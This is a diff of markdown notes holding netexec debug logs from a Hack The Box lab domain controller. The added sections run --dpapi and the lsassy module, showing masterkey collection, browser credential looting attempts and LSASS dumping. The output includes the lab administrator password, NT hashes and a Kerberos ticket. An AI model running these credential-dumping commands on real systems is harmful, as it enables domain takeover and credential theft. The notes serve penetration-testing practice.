@@ -1,4 +1,5 @@
-## --interfaces
+## smb
+### --interfaces
 ```sh
 └─$ netexec smb 10.129.175.223 -u 'active.htb\administrator' -p 'Ticketmaster1968' --interfaces --debug
 [10:36:44] DEBUG    NXC VERSION: 1.4.0 - SmoothOperator - Kali Linux                                                                                                                                                               cli.py:28
@@ -67,7 +68,7 @@
 ```
 
 
-## --loggedon-users
+### --loggedon-users
 https://www.akamai.com/ja/blog/security-research/cold-hard-cache-bypassing-rpc-with-cache-abuse#wk
 ```sh
 └─$ netexec smb 10.129.175.223 -u 'active.htb\administrator' -p 'Ticketmaster1968' --loggedon-users --debug
@@ -134,7 +135,7 @@ https://www.akamai.com/ja/blog/security-research/cold-hard-cache-bypassing-rpc-w
 ```
 
 
-## --pass-pol
+### --pass-pol
 ```sh
 └─$ netexec smb 10.129.175.223 -u 'active.htb\administrator' -p 'Ticketmaster1968' --pass-pol --debug     
 [11:17:59] DEBUG    NXC VERSION: 1.4.0 - SmoothOperator - Kali Linux                                                                                                                                                               cli.py:28
@@ -224,7 +225,7 @@ https://www.akamai.com/ja/blog/security-research/cold-hard-cache-bypassing-rpc-w
 ```
 
 
-## --rid-brute
+### --rid-brute
 ```sh
 └─$ netexec smb 10.129.175.223 -u 'active.htb\administrator' -p 'Ticketmaster1968' --rid-brute --debug
 [11:28:40] DEBUG    NXC VERSION: 1.4.0 - SmoothOperator - Kali Linux                                                                                                                                                               cli.py:28
@@ -312,7 +313,7 @@ https://www.akamai.com/ja/blog/security-research/cold-hard-cache-bypassing-rpc-w
 ```
 
 
-## --users 
+### --users 
 ```sh
 └─$ netexec smb 10.129.175.223 -u 'active.htb\administrator' -p 'Ticketmaster1968' --users --debug
 [12:03:37] DEBUG    NXC VERSION: 1.4.0 - SmoothOperator - Kali Linux                                                                                                                                                               cli.py:28
@@ -393,7 +394,7 @@ https://www.akamai.com/ja/blog/security-research/cold-hard-cache-bypassing-rpc-w
 ```
 
 
-## --sam
+### --sam
 ```sh
 └─$ netexec smb 10.129.175.223 -u 'active.htb\administrator' -p 'Ticketmaster1968' --sam --debug  
 [13:03:11] DEBUG    NXC VERSION: 1.4.0 - SmoothOperator - Kali Linux                                                                                                                                                               cli.py:28
@@ -471,7 +472,7 @@ https://www.akamai.com/ja/blog/security-research/cold-hard-cache-bypassing-rpc-w
 ```
 
 
-## --lsa
+### --lsa
 ```sh
 └─$ netexec smb 10.129.175.223 -u 'active.htb\administrator' -p 'Ticketmaster1968' --lsa --debug
 [14:44:21] DEBUG    NXC VERSION: 1.4.0 - SmoothOperator - Kali Linux                                                                                                                                                               cli.py:28
@@ -551,7 +552,128 @@ https://www.akamai.com/ja/blog/security-research/cold-hard-cache-bypassing-rpc-w
 ```
 
 
-## -M ntdsutil
+### --dpapi
+```sh
+└─$ netexec smb 10.129.175.223 -u 'active.htb\administrator' -p 'Ticketmaster1968' --dpapi --debug
+[15:31:32] DEBUG    NXC VERSION: 1.4.0 - SmoothOperator - Kali Linux                                                                                                                                                               cli.py:28
+           DEBUG    PYTHON VERSION: 3.13.3 (main, Apr 10 2025, 21:38:51) [GCC 14.2.0]                                                                                                                                          netexec.py:81
+           DEBUG    RUNNING ON: Linux Release: 6.12.33+kali-amd64                                                                                                                                                              netexec.py:82
+           DEBUG    Passed args: Namespace(version=False, threads=256, timeout=None, jitter=None, verbose=False, debug=True, no_progress=False, log=None, force_ipv6=False, dns_server=None, dns_tcp=False, dns_timeout=3,     netexec.py:83
+                    protocol='smb', target=['10.129.175.223'], username=['active.htb\\administrator'], password=['Ticketmaster1968'], cred_id=[], ignore_pw_decoding=False, no_bruteforce=False, continue_on_success=False,                 
+                    gfail_limit=None, ufail_limit=None, fail_limit=None, kerberos=False, use_kcache=False, aesKey=None, kdcHost=None, pfx_cert=None, pfx_base64=None, pfx_pass=None, pem_cert=None, pem_key=None,                           
+                    server='https', server_host='0.0.0.0', server_port=None, connectback_host=None, module=None, module_options=[], list_modules=False, show_module_options=False, hash=[], delegate=None, no_s4u2proxy=False,              
+                    domain=None, local_auth=False, port=445, share='C$', smb_server_port=445, no_smbv1=False, gen_relay_list=None, smb_timeout=2, laps=None, generate_hosts_file=None, generate_krb5_file=None, sam=None,                   
+                    lsa=None, ntds=None, dpapi=[], sccm=None, mkfile=None, pvk=None, enabled=False, userntds=None, shares=False, dir=None, interfaces=False, no_write_check=False, filter_shares=None, smb_sessions=False,                  
+                    disks=False, loggedon_users_filter=None, loggedon_users=None, users=None, users_export=None, groups=None, computers=None, local_groups=None, pass_pol=False, rid_brute=None, qwinsta=False,                             
+                    tasklist=False, wmi=None, wmi_namespace='root\\cimv2', spider=None, spider_folder='.', content=False, exclude_dirs='', depth=None, only_files=False, pattern=None, regex=None, put_file=None,                           
+                    get_file=None, append_host=False, exec_method='wmiexec', dcom_timeout=5, get_output_tries=100, codec='utf-8', no_output=False, execute=None, ps_execute=None, obfs=False, amsi_bypass=None,                             
+                    clear_obfscripts=False, force_ps32=False, no_encode=False)                                                                                                                                                              
+           DEBUG    Protocol: smb                                                                                                                                                                                             netexec.py:137
+           DEBUG    Protocol Path: /usr/lib/python3/dist-packages/nxc/protocols/smb.py                                                                                                                                        netexec.py:140
+           DEBUG    Protocol DB Path: /usr/lib/python3/dist-packages/nxc/protocols/smb/database.py                                                                                                                            netexec.py:142
+[15:31:33] DEBUG    symmetric using "pyCryptodomex" for "DES"                                                                                                                                                                 __init__.py:55
+           DEBUG    symmetric using "pyCryptodomex" for "TDES"                                                                                                                                                                __init__.py:55
+           DEBUG    symmetric using "pyCryptodomex" for "AES"                                                                                                                                                                 __init__.py:55
+           DEBUG    symmetric using "pyCryptodomex" for "RC4"                                                                                                                                                                 __init__.py:55
+           DEBUG    Protocol Object: <class 'protocol.smb'>, type: <class 'type'>                                                                                                                                             netexec.py:145
+           DEBUG    Protocol DB Object: <class 'protocol.database'>                                                                                                                                                           netexec.py:147
+           DEBUG    DB Path: /home/kali/.nxc/workspaces/default/smb.db                                                                                                                                                        netexec.py:150
+           DEBUG    Using selector: EpollSelector                                                                                                                                                                      selector_events.py:64
+           DEBUG    Creating ThreadPoolExecutor                                                                                                                                                                                netexec.py:45
+           DEBUG    Creating thread for <class 'protocol.smb'>                                                                                                                                                                 netexec.py:48
+           INFO     Socket info: host=10.129.175.223, hostname=10.129.175.223, kerberos=False, ipv6=False, link-local ipv6=False                                                                                           connection.py:165
+           DEBUG    Kicking off proto_flow                                                                                                                                                                                 connection.py:227
+           INFO     Creating SMBv3 connection to 10.129.175.223                                                                                                                                                                   smb.py:606
+[15:31:34] DEBUG    Created connection object                                                                                                                                                                              connection.py:232
+[15:31:35] DEBUG    Server OS: Windows 7 / Server 2008 R2 Build 7601 6.1 build 7601                                                                                                                                               smb.py:280
+[15:31:37] INFO     Creating SMBv1 connection to 10.129.175.223                                                                                                                                                                   smb.py:575
+[15:31:38] INFO     SMBv1 disabled on 10.129.175.223                                                                                                                                                                              smb.py:598
+           DEBUG    Update Hosts: [{'id': 3, 'ip': '10.129.175.223', 'hostname': 'DC', 'domain': 'active.htb', 'os': 'Windows 7 / Server 2008 R2 Build 7601', 'dc': None, 'smbv1': False, 'signing': True, 'spooler': None,  database.py:265
+                    'zerologon': None, 'petitpotam': None}]                                                                                                                                                                                 
+           DEBUG    add_host() - Host IDs Updated: [3]                                                                                                                                                                       database.py:275
+           INFO     Error resolving hostname active.htb: [Errno -2] Name or service not known                                                                                                                              connection.py:192
+           INFO     Resolved domain: active.htb with dns, kdcHost: None                                                                                                                                                           smb.py:321
+[15:31:38] INFO     SMB         10.129.175.223  445    DC               Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)                                                      smb.py:327
+           DEBUG    Trying to authenticate using plaintext with domain                                                                                                                                                     connection.py:497
+           INFO     Creating SMBv3 connection to 10.129.175.223                                                                                                                                                                   smb.py:606
+[15:31:41] DEBUG    Logged in with password to SMB with active.htb/administrator                                                                                                                                                  smb.py:468
+           DEBUG    self.is_guest=False                                                                                                                                                                                           smb.py:470
+           DEBUG    Checking if user is admin on 10.129.175.223                                                                                                                                                                   smb.py:646
+[15:31:49] DEBUG    User is admin on 10.129.175.223!                                                                                                                                                                              smb.py:661
+           DEBUG    Adding credential: active.htb/administrator:Ticketmaster1968                                                                                                                                                  smb.py:474
+           DEBUG    Adding credentials: [{'id': 2, 'domain': 'active.htb', 'username': 'administrator', 'password': 'Ticketmaster1968', 'credtype': 'plaintext', 'pillaged_from_hostid': None}]                              database.py:332
+           DEBUG    Using 'ip' column for filtering                                                                                                                                                                          database.py:122
+           DEBUG    filter_term is an IP address: 10.129.175.223                                                                                                                                                             database.py:133
+           DEBUG    smb hosts() - results: [(3, '10.129.175.223', 'DC', 'active.htb', 'Windows 7 / Server 2008 R2 Build 7601', None, False, True, None, None, None)]                                                         database.py:485
+[15:31:49] INFO     SMB         10.129.175.223  445    DC               active.htb\administrator:Ticketmaster1968 (Pwn3d!)                                                                                                        smb.py:481
+           DEBUG    Adding admin user: active.htb/administrator:Ticketmaster1968@10.129.175.223                                                                                                                                   smb.py:486
+           DEBUG    Using 'ip' column for filtering                                                                                                                                                                          database.py:122
+           DEBUG    filter_term is an IP address: 10.129.175.223                                                                                                                                                             database.py:133
+           DEBUG    smb hosts() - results: [(3, '10.129.175.223', 'DC', 'active.htb', 'Windows 7 / Server 2008 R2 Build 7601', None, False, True, None, None, None)]                                                         database.py:485
+           DEBUG    users: <sqlalchemy.engine.cursor.CursorResult object at 0x7f74f5529f60>, hosts: [(3, '10.129.175.223', 'DC', 'active.htb', 'Windows 7 / Server 2008 R2 Build 7601', None, False, True, None, None,       database.py:362
+                    None)]                                                                                                                                                                                                                  
+           DEBUG    Calling command arguments                                                                                                                                                                              connection.py:241
+           DEBUG    Calling dpapi()                                                                                                                                                                                        connection.py:263
+           DEBUG    get_domain_backupkey(domain=active.htb) => []                                                                                                                                                            database.py:716
+           DEBUG    Connecting to active.htb                                                                                                                                                                                      smb.py:160
+           DEBUG    Could not create connection object to active.htb                                                                                                                                                              smb.py:117
+           DEBUG    Connecting to 10.129.175.223                                                                                                                                                                                  smb.py:160
+[15:31:51] DEBUG    Authenticating with administrator through NTLM                                                                                                                                                                smb.py:163
+[15:31:52] INFO     SMB         10.129.175.223  445    DC               Collecting DPAPI masterkeys, grab a coffee and be patient...                                                                                             dpapi.py:67
+[15:31:52] DEBUG    Masterkeys Triage: <dploot.triage.masterkeys.MasterkeysTriage object at 0x7f74f5522270>                                                                                                                      dpapi.py:76
+           DEBUG    Collecting user masterkeys                                                                                                                                                                                   dpapi.py:78
+[15:31:58] DEBUG    Found MasterKey: \\10.129.175.223\C$\Users\Administrator\AppData\Roaming\Microsoft\Protect\S-1-5-21-405608879-3187717380-1996298813-500\cae673a5-24a8-44de-b3e9-6a3987653ac1                           masterkeys.py:218
+[15:32:00] DEBUG    Found MasterKey: \\10.129.175.223\C$\Users\Administrator\AppData\Roaming\Microsoft\Protect\S-1-5-21-405608879-3187717380-1996298813-500\d2d5c8b5-73e5-468e-8d7a-5801c0f23c8c                           masterkeys.py:218
+[15:32:05] DEBUG    Collecting machine masterkeys                                                                                                                                                                                dpapi.py:81
+[15:32:17] DEBUG    Got Bootkey: b'ff954ee81ffb63937b563f523caf1d59'                                                                                                                                                        masterkeys.py:77
+[15:33:05] DEBUG    Found SYSTEM system MasterKey: \\10.129.175.223\C$\Windows\System32\Microsoft\Protect\S-1-5-18\09d54a81-ccc1-478c-9ac9-84b106a885c0                                                                    masterkeys.py:122
+[15:33:11] DEBUG    Found SYSTEM user MasterKey: \\10.129.175.223\C$\Windows\System32\Microsoft\Protect\S-1-5-18\User\2710b833-8692-4678-9f26-2fba8219f2b3                                                                 masterkeys.py:152
+[15:33:13] DEBUG    Found SYSTEM user MasterKey: \\10.129.175.223\C$\Windows\System32\Microsoft\Protect\S-1-5-18\User\43ea2159-28dc-4507-90bd-751f19e7db5d                                                                 masterkeys.py:152
+[15:33:16] DEBUG    Found SYSTEM user MasterKey: \\10.129.175.223\C$\Windows\System32\Microsoft\Protect\S-1-5-18\User\86e2929f-5a99-4860-a8a3-e2b9a8eb65f9                                                                 masterkeys.py:152
+[15:33:21] DEBUG    Found SYSTEM system MasterKey: \\10.129.175.223\C$\Windows\System32\Microsoft\Protect\S-1-5-20\18b1bd41-905a-4066-9d39-f8a1acf0c9f4                                                                    masterkeys.py:122
+[15:33:23] INFO     SMB         10.129.175.223  445    DC               Got 7 decrypted masterkeys. Looting secrets...                                                                                                           smb.py:1725
+[15:33:23] DEBUG    Credentials Triage Object: <dploot.triage.credentials.CredentialsTriage object at 0x7f74f5522120>                                                                                                            smb.py:1745
+[15:33:39] DEBUG    Exception occurred while trying to read Users\Administrator\AppData\Local\Google\Chrome\User Data\Local State: SMB SessionError: code: 0xc000003a - STATUS_OBJECT_PATH_NOT_FOUND - {Path Not Found} The path  smb.py:284
+                    %hs does not exist.                                                                                                                                                                                                     
+           DEBUG    Exception occurred while trying to read Users\Administrator\AppData\Local\Google\Chrome\User Data\Default\Login Data: SMB SessionError: code: 0xc000003a - STATUS_OBJECT_PATH_NOT_FOUND - {Path Not Found}    smb.py:284
+                    The path %hs does not exist.                                                                                                                                                                                            
+[15:33:40] DEBUG    Exception occurred while trying to read Users\Administrator\AppData\Local\Google\Chrome\User Data\Default\Web Data: SMB SessionError: code: 0xc000003a - STATUS_OBJECT_PATH_NOT_FOUND - {Path Not Found} The  smb.py:284
+                    path %hs does not exist.                                                                                                                                                                                                
+[15:33:41] DEBUG    Exception occurred while trying to read Users\Administrator\AppData\Local\Microsoft\Edge\User Data\Local State: SMB SessionError: code: 0xc000003a - STATUS_OBJECT_PATH_NOT_FOUND - {Path Not Found} The path smb.py:284
+                    %hs does not exist.                                                                                                                                                                                                     
+[15:33:42] DEBUG    Exception occurred while trying to read Users\Administrator\AppData\Local\Microsoft\Edge\User Data\Default\Login Data: SMB SessionError: code: 0xc000003a - STATUS_OBJECT_PATH_NOT_FOUND - {Path Not Found}   smb.py:284
+                    The path %hs does not exist.                                                                                                                                                                                            
+[15:33:43] DEBUG    Exception occurred while trying to read Users\Administrator\AppData\Local\Microsoft\Edge\User Data\Default\Web Data: SMB SessionError: code: 0xc000003a - STATUS_OBJECT_PATH_NOT_FOUND - {Path Not Found} The smb.py:284
+                    path %hs does not exist.                                                                                                                                                                                                
+[15:33:44] DEBUG    Exception occurred while trying to read Users\Administrator\AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State: SMB SessionError: code: 0xc000003a - STATUS_OBJECT_PATH_NOT_FOUND - {Path Not    smb.py:284
+                    Found} The path %hs does not exist.                                                                                                                                                                                     
+[15:33:45] DEBUG    Exception occurred while trying to read Users\Administrator\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Login Data: SMB SessionError: code: 0xc000003a - STATUS_OBJECT_PATH_NOT_FOUND - {Path smb.py:284
+                    Not Found} The path %hs does not exist.                                                                                                                                                                                 
+[15:33:46] DEBUG    Exception occurred while trying to read Users\Administrator\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Web Data: SMB SessionError: code: 0xc000003a - STATUS_OBJECT_PATH_NOT_FOUND - {Path   smb.py:284
+                    Not Found} The path %hs does not exist.                                                                                                                                                                                 
+[15:33:47] DEBUG    Exception occurred while trying to read Users\SVC_TGS\AppData\Local\Google\Chrome\User Data\Local State: SMB SessionError: code: 0xc000003a - STATUS_OBJECT_PATH_NOT_FOUND - {Path Not Found} The path %hs    smb.py:284
+                    does not exist.                                                                                                                                                                                                         
+[15:33:48] DEBUG    Exception occurred while trying to read Users\SVC_TGS\AppData\Local\Google\Chrome\User Data\Default\Login Data: SMB SessionError: code: 0xc000003a - STATUS_OBJECT_PATH_NOT_FOUND - {Path Not Found} The path smb.py:284
+                    %hs does not exist.                                                                                                                                                                                                     
+[15:33:50] DEBUG    Exception occurred while trying to read Users\SVC_TGS\AppData\Local\Google\Chrome\User Data\Default\Web Data: SMB SessionError: code: 0xc000003a - STATUS_OBJECT_PATH_NOT_FOUND - {Path Not Found} The path   smb.py:284
+                    %hs does not exist.                                                                                                                                                                                                     
+[15:33:51] DEBUG    Exception occurred while trying to read Users\SVC_TGS\AppData\Local\Microsoft\Edge\User Data\Local State: SMB SessionError: code: 0xc000003a - STATUS_OBJECT_PATH_NOT_FOUND - {Path Not Found} The path %hs   smb.py:284
+                    does not exist.                                                                                                                                                                                                         
+[15:33:52] DEBUG    Exception occurred while trying to read Users\SVC_TGS\AppData\Local\Microsoft\Edge\User Data\Default\Login Data: SMB SessionError: code: 0xc000003a - STATUS_OBJECT_PATH_NOT_FOUND - {Path Not Found} The     smb.py:284
+                    path %hs does not exist.                                                                                                                                                                                                
+[15:33:53] DEBUG    Exception occurred while trying to read Users\SVC_TGS\AppData\Local\Microsoft\Edge\User Data\Default\Web Data: SMB SessionError: code: 0xc000003a - STATUS_OBJECT_PATH_NOT_FOUND - {Path Not Found} The path  smb.py:284
+                    %hs does not exist.                                                                                                                                                                                                     
+[15:33:54] DEBUG    Exception occurred while trying to read Users\SVC_TGS\AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State: SMB SessionError: code: 0xc000003a - STATUS_OBJECT_PATH_NOT_FOUND - {Path Not Found}   smb.py:284
+                    The path %hs does not exist.                                                                                                                                                                                            
+[15:33:55] DEBUG    Exception occurred while trying to read Users\SVC_TGS\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Login Data: SMB SessionError: code: 0xc000003a - STATUS_OBJECT_PATH_NOT_FOUND - {Path Not   smb.py:284
+                    Found} The path %hs does not exist.                                                                                                                                                                                     
+[15:33:56] DEBUG    Exception occurred while trying to read Users\SVC_TGS\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Web Data: SMB SessionError: code: 0xc000003a - STATUS_OBJECT_PATH_NOT_FOUND - {Path Not     smb.py:284
+                    Found} The path %hs does not exist.                                                                                                                                                                                     
+[15:34:05] DEBUG    Closing connection to: 10.129.175.223
+```
+
+
+### -M ntdsutil
 ```sh
 └─$ netexec smb 10.129.253.25 -u 'active.htb\administrator' -p 'Ticketmaster1968' -M ntdsutil --debug
 [10:13:24] DEBUG    NXC VERSION: 1.4.0 - SmoothOperator - Kali Linux                                                                                                                                                               cli.py:28
@@ -744,4 +866,199 @@ https://www.akamai.com/ja/blog/security-research/cold-hard-cache-bypassing-rpc-w
 [10:15:03] INFO     NTDSUTIL    10.129.253.25   445    DC               To extract only enabled accounts from the output file, run the following command:                                                                    ntdsutil.py:167
 [10:15:03] INFO     NTDSUTIL    10.129.253.25   445    DC               grep -iv disabled None.ntds | cut -d ':' -f1                                                                                                         ntdsutil.py:168
            DEBUG    Closing connection to: 10.129.253.25                                                                                                                                                                   connection.py:178
+```
+
+
+### -M lsassy
+```sh
+└─$ netexec smb 10.129.175.223 -u 'active.htb\administrator' -p 'Ticketmaster1968' -M lsassy --debug
+[15:12:07] DEBUG    NXC VERSION: 1.4.0 - SmoothOperator - Kali Linux                                                                                                                                                               cli.py:28
+           DEBUG    PYTHON VERSION: 3.13.3 (main, Apr 10 2025, 21:38:51) [GCC 14.2.0]                                                                                                                                          netexec.py:81
+           DEBUG    RUNNING ON: Linux Release: 6.12.33+kali-amd64                                                                                                                                                              netexec.py:82
+           DEBUG    Passed args: Namespace(version=False, threads=256, timeout=None, jitter=None, verbose=False, debug=True, no_progress=False, log=None, force_ipv6=False, dns_server=None, dns_tcp=False, dns_timeout=3,     netexec.py:83
+                    protocol='smb', target=['10.129.175.223'], username=['active.htb\\administrator'], password=['Ticketmaster1968'], cred_id=[], ignore_pw_decoding=False, no_bruteforce=False, continue_on_success=False,                 
+                    gfail_limit=None, ufail_limit=None, fail_limit=None, kerberos=False, use_kcache=False, aesKey=None, kdcHost=None, pfx_cert=None, pfx_base64=None, pfx_pass=None, pem_cert=None, pem_key=None,                           
+                    server='https', server_host='0.0.0.0', server_port=None, connectback_host=None, module=['lsassy'], module_options=[], list_modules=False, show_module_options=False, hash=[], delegate=None,                            
+                    no_s4u2proxy=False, domain=None, local_auth=False, port=445, share='C$', smb_server_port=445, no_smbv1=False, gen_relay_list=None, smb_timeout=2, laps=None, generate_hosts_file=None,                                  
+                    generate_krb5_file=None, sam=None, lsa=None, ntds=None, dpapi=None, sccm=None, mkfile=None, pvk=None, enabled=False, userntds=None, shares=False, dir=None, interfaces=False, no_write_check=False,                     
+                    filter_shares=None, smb_sessions=False, disks=False, loggedon_users_filter=None, loggedon_users=None, users=None, users_export=None, groups=None, computers=None, local_groups=None, pass_pol=False,                    
+                    rid_brute=None, qwinsta=False, tasklist=False, wmi=None, wmi_namespace='root\\cimv2', spider=None, spider_folder='.', content=False, exclude_dirs='', depth=None, only_files=False, pattern=None,                       
+                    regex=None, put_file=None, get_file=None, append_host=False, exec_method='wmiexec', dcom_timeout=5, get_output_tries=100, codec='utf-8', no_output=False, execute=None, ps_execute=None, obfs=False,                    
+                    amsi_bypass=None, clear_obfscripts=False, force_ps32=False, no_encode=False)                                                                                                                                            
+           DEBUG    Protocol: smb                                                                                                                                                                                             netexec.py:137
+           DEBUG    Protocol Path: /usr/lib/python3/dist-packages/nxc/protocols/smb.py                                                                                                                                        netexec.py:140
+           DEBUG    Protocol DB Path: /usr/lib/python3/dist-packages/nxc/protocols/smb/database.py                                                                                                                            netexec.py:142
+           DEBUG    symmetric using "pyCryptodomex" for "DES"                                                                                                                                                                 __init__.py:55
+           DEBUG    symmetric using "pyCryptodomex" for "TDES"                                                                                                                                                                __init__.py:55
+           DEBUG    symmetric using "pyCryptodomex" for "AES"                                                                                                                                                                 __init__.py:55
+           DEBUG    symmetric using "pyCryptodomex" for "RC4"                                                                                                                                                                 __init__.py:55
+           DEBUG    Protocol Object: <class 'protocol.smb'>, type: <class 'type'>                                                                                                                                             netexec.py:145
+           DEBUG    Protocol DB Object: <class 'protocol.database'>                                                                                                                                                           netexec.py:147
+           DEBUG    DB Path: /home/kali/.nxc/workspaces/default/smb.db                                                                                                                                                        netexec.py:150
+           DEBUG    Modules to be Loaded for sanity check: ['lsassy'], <class 'list'>                                                                                                                                         netexec.py:182
+           DEBUG    Loading module for sanity check lsassy at path /usr/lib/python3/dist-packages/nxc/modules/lsassy.py                                                                                                       netexec.py:189
+           DEBUG    Supported protocols: ['smb']                                                                                                                                                                          moduleloader.py:71
+           DEBUG    Protocol: smb                                                                                                                                                                                         moduleloader.py:72
+           DEBUG    Using selector: EpollSelector                                                                                                                                                                      selector_events.py:64
+           DEBUG    Creating ThreadPoolExecutor                                                                                                                                                                                netexec.py:45
+           DEBUG    Creating thread for <class 'protocol.smb'>                                                                                                                                                                 netexec.py:48
+           INFO     Socket info: host=10.129.175.223, hostname=10.129.175.223, kerberos=False, ipv6=False, link-local ipv6=False                                                                                           connection.py:165
+           DEBUG    Kicking off proto_flow                                                                                                                                                                                 connection.py:227
+           INFO     Creating SMBv3 connection to 10.129.175.223                                                                                                                                                                   smb.py:606
+[15:12:09] DEBUG    Created connection object                                                                                                                                                                              connection.py:232
+[15:12:10] DEBUG    Server OS: Windows 7 / Server 2008 R2 Build 7601 6.1 build 7601                                                                                                                                               smb.py:280
+[15:12:12] INFO     Creating SMBv1 connection to 10.129.175.223                                                                                                                                                                   smb.py:575
+[15:12:13] INFO     SMBv1 disabled on 10.129.175.223                                                                                                                                                                              smb.py:598
+           DEBUG    Update Hosts: [{'id': 3, 'ip': '10.129.175.223', 'hostname': 'DC', 'domain': 'active.htb', 'os': 'Windows 7 / Server 2008 R2 Build 7601', 'dc': None, 'smbv1': False, 'signing': True, 'spooler': None,  database.py:265
+                    'zerologon': None, 'petitpotam': None}]                                                                                                                                                                                 
+           DEBUG    add_host() - Host IDs Updated: [3]                                                                                                                                                                       database.py:275
+           INFO     Error resolving hostname active.htb: [Errno -2] Name or service not known                                                                                                                              connection.py:192
+           INFO     Resolved domain: active.htb with dns, kdcHost: None                                                                                                                                                           smb.py:321
+[15:12:13] INFO     SMB         10.129.175.223  445    DC               Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)                                                      smb.py:327
+           DEBUG    Trying to authenticate using plaintext with domain                                                                                                                                                     connection.py:497
+           INFO     Creating SMBv3 connection to 10.129.175.223                                                                                                                                                                   smb.py:606
+[15:12:15] DEBUG    Logged in with password to SMB with active.htb/administrator                                                                                                                                                  smb.py:468
+           DEBUG    self.is_guest=False                                                                                                                                                                                           smb.py:470
+           DEBUG    Checking if user is admin on 10.129.175.223                                                                                                                                                                   smb.py:646
+[15:12:24] DEBUG    User is admin on 10.129.175.223!                                                                                                                                                                              smb.py:661
+           DEBUG    Adding credential: active.htb/administrator:Ticketmaster1968                                                                                                                                                  smb.py:474
+           DEBUG    Adding credentials: [{'id': 2, 'domain': 'active.htb', 'username': 'administrator', 'password': 'Ticketmaster1968', 'credtype': 'plaintext', 'pillaged_from_hostid': None}]                              database.py:332
+           DEBUG    Using 'ip' column for filtering                                                                                                                                                                          database.py:122
+           DEBUG    filter_term is an IP address: 10.129.175.223                                                                                                                                                             database.py:133
+           DEBUG    smb hosts() - results: [(3, '10.129.175.223', 'DC', 'active.htb', 'Windows 7 / Server 2008 R2 Build 7601', None, False, True, None, None, None)]                                                         database.py:485
+[15:12:24] INFO     SMB         10.129.175.223  445    DC               active.htb\administrator:Ticketmaster1968 (Pwn3d!)                                                                                                        smb.py:481
+           DEBUG    Adding admin user: active.htb/administrator:Ticketmaster1968@10.129.175.223                                                                                                                                   smb.py:486
+           DEBUG    Using 'ip' column for filtering                                                                                                                                                                          database.py:122
+           DEBUG    filter_term is an IP address: 10.129.175.223                                                                                                                                                             database.py:133
+           DEBUG    smb hosts() - results: [(3, '10.129.175.223', 'DC', 'active.htb', 'Windows 7 / Server 2008 R2 Build 7601', None, False, True, None, None, None)]                                                         database.py:485
+           DEBUG    users: <sqlalchemy.engine.cursor.CursorResult object at 0x7f6a3f780d70>, hosts: [(3, '10.129.175.223', 'DC', 'active.htb', 'Windows 7 / Server 2008 R2 Build 7601', None, False, True, None, None,       database.py:362
+                    None)]                                                                                                                                                                                                                  
+           INFO     Loading modules for target: 10.129.175.223                                                                                                                                                             connection.py:589
+           DEBUG    Supported protocols: ['smb']                                                                                                                                                                          moduleloader.py:71
+           DEBUG    Protocol: smb                                                                                                                                                                                         moduleloader.py:72
+           DEBUG    Calling modules                                                                                                                                                                                        connection.py:238
+           DEBUG    Loading module lsassy - <NXCModule.NXCModule object at 0x7f6a3f608590>                                                                                                                                 connection.py:273
+           DEBUG    Loading context for module lsassy - <NXCModule.NXCModule object at 0x7f6a3f608590>                                                                                                                     connection.py:283
+           DEBUG    Module lsassy has on_admin_login method                                                                                                                                                                connection.py:297
+[15:12:37] DEBUG    Found ThreadListStream @1ac Size: 1252                                                                                                                                                               minidumpfile.py:108
+           DEBUG    Found ModuleListStream @69c Size: 10480                                                                                                                                                              minidumpfile.py:112
+[15:12:38] DEBUG    Found Memory64ListStream @d3b1 Size: 10864                                                                                                                                                           minidumpfile.py:132
+[15:12:41] DEBUG    Found SystemInfoStream @8c Size: 56                                                                                                                                                                  minidumpfile.py:122
+[15:12:42] DEBUG    Found MiscInfoStream @c4 Size: 232                                                                                                                                                                   minidumpfile.py:168
+[15:12:43] DEBUG    Found HandleDataStream @d3a1 Size: 16                                                                                                                                                                minidumpfile.py:152
+           DEBUG    Found UnusedStream @0 Size: 0                                                                                                                                                                         minidumpfile.py:99
+           DEBUG    Found UnusedStream @0 Size: 0                                                                                                                                                                         minidumpfile.py:99
+           DEBUG    Found UnusedStream @0 Size: 0                                                                                                                                                                         minidumpfile.py:99
+[15:14:38] DEBUG    Closed dumper file                                                                                                                                                                                          lsassy.py:74
+           DEBUG    File path: /Windows/Temp//f18.otf                                                                                                                                                                           lsassy.py:76
+[15:14:39] DEBUG    Deleted dumper file                                                                                                                                                                                         lsassy.py:80
+           DEBUG    Cred: {'hostname': '10.129.175.223', 'username': 'DC$', 'password': None, 'domain': 'ACTIVE', 'lmhash': None, 'nthash': 'b708b6f85a816852dfd65a8f81ca175e', 'sha1':                                         lsassy.py:91
+                    '63ea1ae4a533c1104e374c5c5c565a98df7a6d9f', 'ticket': None, 'ssp': 'msv_creds', 'masterkey': None}                                                                                                                      
+           DEBUG    Cred: {'hostname': '10.129.175.223', 'username': 'DC$', 'password':                                                                                                                                         lsassy.py:91
+                    'efd1bb12f57393e2d901e38aabc806bce83df809a3c69183e2b3d9bc3f4e5a03f53a24e1f2c01ca7f0c847cc9e169473a673c251eb734c8c2e509181337ce8fc502cefb1e76cc4df3d0b56a3aaedab8d56edc00d0bfc22bad09e2243a08d60fa7ab21d0cc7             
+                    d3dde8db3b8a274365a0d2583ebb7bdf02bae7466dc929aaabd53212c9bf6532c18311a50da888f509d3329fea43eb17c2089a8a3eec6033f1e2db4a32888dcfc09ecd60909b71ca2235bb89d102aabc11d8bd8cf24106ddc521c4b3194594703c0369e3181             
+                    e231fc9b140b614a422bfb153197242bf435d6992d4e0d2ee44102ba7130d05e8d3c03c7084', 'domain': 'ACTIVE', 'lmhash': None, 'nthash': None, 'sha1': None, 'ticket': None, 'ssp': 'wdigest_creds', 'masterkey': None}              
+           DEBUG    Cred: {'hostname': '10.129.175.223', 'username': 'DC$', 'password': None, 'domain': 'ACTIVE.HTB', 'lmhash': None, 'nthash': None, 'sha1': None, 'ticket': {'file':                                          lsassy.py:91
+                    'TGT_ACTIVE.HTB_DC$_krbtgt_ACTIVE.HTB_c7a0871e_20250726073852.kirbi', 'domain': 'ACTIVE.HTB', 'endtime': datetime.datetime(2025, 7, 26, 7, 38, 52, tzinfo=<pypykatz.commons.filetime.UTC object at                      
